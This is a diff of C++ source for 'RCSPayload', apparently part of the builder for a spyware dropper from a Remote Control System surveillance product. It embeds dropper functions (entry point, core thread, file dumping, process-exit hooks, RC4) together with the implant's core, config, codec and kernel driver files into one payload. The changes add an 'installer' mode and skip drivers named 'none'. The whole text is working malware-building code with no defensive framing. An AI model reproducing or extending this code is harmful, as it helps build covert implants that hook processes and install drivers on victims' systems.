@@ -28,11 +28,12 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components )
 	cout << "Core (32bit)   : " << rcs_.core() << endl;
 	cout << "Core (64bit)   : " << (rcs_.core64().empty() ? "none" : rcs_.core64()) << endl;
 	cout << "Config         : " << rcs_.config() << endl;
-	cout << "Driver (32bit) : " << rcs_.driver() << endl;
+	cout << "Driver (32bit) : " << (rcs_.driver().empty() ? "none" : rcs_.driver()) << endl;
 	cout << "Driver (64bit) : " << (rcs_.driver64().empty() ? "none" : rcs_.driver64()) << endl;
 	cout << "Codec          : " << rcs_.codec() << endl;
 	cout << "Install dir    : " << rcs_.directory() << endl;
 	cout << "Manifest       : " << ( rcs_.manifest() ? "true" : "false" ) << endl;
+	cout << "Installer		: " << (rcs_.installer() ? "true" : "false" ) << endl;
 	
 	cout << endl;
 	
@@ -78,19 +79,22 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components )
 	// DROPPER CODE
 	
 	// entry point must always be the first function copied
-	ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr);
-	ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
-	ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
-    OFFSET(ptr);
-	END_MARKER_AND_INCREMENT_PTR(ptr);
-	ptr += embedFunction_(components.hookCall(), header->functions.hookCall, ptr);
-	OFFSET(ptr);
-	END_MARKER_AND_INCREMENT_PTR(ptr);
-	ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
-	OFFSET(ptr);
-	END_MARKER_AND_INCREMENT_PTR(ptr);
-	ptr += embedFunction_(components.exit(), header->functions.exitHook, ptr);
-	ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
+	if (!rcs_.installer())
+	{
+		ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr);
+		ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
+		ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
+		OFFSET(ptr);
+		END_MARKER_AND_INCREMENT_PTR(ptr);
+		ptr += embedFunction_(components.hookCall(), header->functions.hookCall, ptr);
+		OFFSET(ptr);
+		END_MARKER_AND_INCREMENT_PTR(ptr);
+		ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
+		OFFSET(ptr);
+		END_MARKER_AND_INCREMENT_PTR(ptr);
+		ptr += embedFunction_(components.exit(), header->functions.exitHook, ptr);
+		ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
+	}
 	
 	// RCS FILES
 	
@@ -102,12 +106,22 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components )
 	if ( rcs_.codec_size() ) {
 		ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr );
 	}
-	if ( rcs_.driver_size() ) {
-		ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr );
+
+	if ( rcs_.driver_size() ) 
+	{
+		if ( rcs_.driver().filename() != string("none"))
+		//if ( strcmp(rcs_.driver().filename().com .c_str(), "null") )
+			ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr );
 	}
-	if (rcs_.driver64_size() ) {
-		ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr );
-	} 
+
+	
+	if (rcs_.driver64_size() ) 
+	{
+		if ( rcs_.driver64().filename() != string("none"))
+		//if ( strcmp(rcs_.driver64().filename().c_str(), "null") )
+			ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr );
+	}
+	
 	
 	// DLL CALLS
 	
